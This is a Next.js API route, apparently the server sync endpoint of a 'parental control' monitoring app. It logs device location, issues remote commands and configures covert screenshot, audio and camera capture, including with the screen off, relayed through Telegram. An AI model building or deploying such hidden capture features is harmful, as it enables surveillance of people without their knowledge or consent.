import { NextRequest, NextResponse } from 'next/server';
import { connectToDatabase } from '@/lib/mongodb';
import { Device, IDevice } from '@/models/Device';
import { Command } from '@/models/Command';
import { TelemetryLog } from '@/models/TelemetryLog';
import { verifyToken } from '@/lib/auth';

export async function POST(req: NextRequest) {
  try {
    await connectToDatabase();

    // 1. Authenticate Device via Token Header
    let device: IDevice | null = null;
    const authHeader = req.headers.get('Authorization');
    const deviceTokenHeader = req.headers.get('x-device-token');

    if (authHeader && authHeader.startsWith('Bearer ')) {
      const token = authHeader.substring(7);
      const payload = verifyToken(token);
      if (payload && payload.deviceId) {
        device = await Device.findById(payload.deviceId);
      }
    }

    if (!device && deviceTokenHeader) {
      device = await Device.findOne({ deviceToken: deviceTokenHeader });
    }

    if (!device) {
      return NextResponse.json({ error: 'Unauthorized device' }, { status: 401 });
    }

    // 2. Parse Body Telemetry
    const body = await req.json().catch(() => ({}));
    const {
      batteryLevel,
      isCharging,
      location,
      appVersion,
      executedCommandIds,
    } = body;

    // Update Device Status
    if (typeof batteryLevel === 'number') {
      device.batteryLevel = Math.max(0, Math.min(100, batteryLevel));
    }
    if (typeof isCharging === 'boolean') {
      device.isCharging = isCharging;
    }
    if (appVersion) {
      device.appVersion = appVersion;
    }
    if (location && typeof location.latitude === 'number' && typeof location.longitude === 'number') {
      device.lastLocation = {
        latitude: location.latitude,
        longitude: location.longitude,
        accuracy: location.accuracy || 0,
        timestamp: location.timestamp ? new Date(location.timestamp) : new Date(),
      };
    }
    device.lastSyncAt = new Date();
    await device.save();

    // 3. Save historical telemetry log
    if (typeof batteryLevel === 'number' || location?.latitude) {
      await TelemetryLog.create({
        deviceId: device._id,
        batteryLevel: device.batteryLevel || 100,
        isCharging: device.isCharging || false,
        latitude: device.lastLocation?.latitude,
        longitude: device.lastLocation?.longitude,
        accuracy: device.lastLocation?.accuracy,
        recordedAt: new Date(),
      });
    }

    // 4. Mark executed commands as EXECUTED
    if (Array.isArray(executedCommandIds) && executedCommandIds.length > 0) {
      await Command.updateMany(
        {
          _id: { $in: executedCommandIds },
          deviceId: device._id,
        },
        {
          $set: {
            status: 'EXECUTED',
            executedAt: new Date(),
          },
        }
      );
    }

    // 5. Fetch Pending Commands for this device
    const pendingCommands = await Command.find({
      deviceId: device._id,
      status: 'PENDING',
    })
      .sort({ createdAt: 1 })
      .limit(10)
      .lean();

    return NextResponse.json({
      status: 'success',
      serverTime: Date.now(),
      config: {
        syncIntervalSeconds: device.settings.syncIntervalSeconds || (device.settings.syncIntervalMinutes ? device.settings.syncIntervalMinutes * 60 : 5),
        syncIntervalMinutes: device.settings.syncIntervalMinutes || 15,
        telegramBotToken: device.settings.telegramBotToken || '',
        telegramChatId: device.settings.telegramChatId || '',
        isMonitoringActive: device.settings.isMonitoringActive ?? true,
        sendScreenshot: device.settings.sendScreenshot ?? true,
        screenshotInterval: device.settings.screenshotInterval || 10,
        sendLocation: device.settings.sendLocation ?? true,
        locationInterval: device.settings.locationInterval || 10,
        sendAudio: device.settings.sendAudio ?? false,
        audioDuration: device.settings.audioDuration || 60,
        audioScreenOff: device.settings.audioScreenOff ?? false,
        sendCamera: device.settings.sendCamera ?? false,
        cameraInterval: device.settings.cameraInterval || 10,
        cameraScreenOff: device.settings.cameraScreenOff ?? false,
      },
      isLocked: device.isLocked || false,
      lockMessage: device.lockMessage || 'Device is locked by parental control.',
      pendingCommands: pendingCommands.map((cmd) => ({
        id: cmd._id.toString(),
        type: cmd.type,
        params: cmd.params || {},
        createdAt: cmd.createdAt,
      })),
    });
  } catch (error: any) {
    console.error('Sync error:', error);
    return NextResponse.json({ error: error.message || 'Server error' }, { status: 500 });
  }
}
